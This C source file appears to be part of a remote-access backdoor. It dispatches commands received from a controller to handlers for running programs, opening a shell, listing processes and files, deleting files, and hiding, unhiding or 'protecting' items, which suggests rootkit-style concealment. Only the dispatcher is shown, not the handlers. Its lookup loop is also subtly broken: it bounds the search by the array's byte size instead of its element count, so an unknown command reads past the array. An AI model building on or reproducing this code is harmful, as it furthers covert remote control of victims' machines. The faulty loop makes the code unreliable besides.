#include "inc/cmds.h"
#include "inc/job.h"
#include "inc/util.h"

#include <sys/utsname.h>

#include <inttypes.h>
#include <sys/stat.h>

#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>

#include <math.h>
#include <time.h>

struct cmd_handler_t {
  char *(*handler)(job_t *job);
  cmd_t cmd;
};

// recv all the data for the job
bool __cmd_recv_all(job_t *job) {
  while (!job->complete)
    if (job_recv(job, false) != JOB_RECV_OK)
      return false;
  return true;
}

struct cmd_handler_t handlers[] = {
    {.handler = cmd_ps,      .cmd = 'O'},
    {.handler = cmd_run,     .cmd = 'R'},
    {.handler = cmd_info,    .cmd = 'I'},
    {.handler = cmd_list,    .cmd = 'L'},
    {.handler = cmd_hide,    .cmd = 'H'},
    {.handler = cmd_shell,   .cmd = 'S'},
    {.handler = cmd_chdir,   .cmd = 'C'},
    {.handler = cmd_unhide,  .cmd = 'U'},
    {.handler = cmd_delete,  .cmd = 'D'},
    {.handler = cmd_protect, .cmd = 'P'},
};

bool cmd_handle(job_t *job) {
  struct cmd_handler_t *h   = NULL;
  char                 *res = NULL;
  uint8_t               i   = 0;

  for (; i < sizeof(handlers); i++) {
    if (handlers[i].cmd == job->cmd) {
      h = &handlers[i];
      break;
    }
  }

  if (NULL == h)
    return false;

  job_debug("handling the command '%c' with %p", job->cmd, h->handler);

  if ((res = h->handler(job)) != NULL) {
    job_data_clear(job);
    job_data_set(job, res, 0);

    job->complete = true;
    job_send(job, false);
  }

  return true;
}
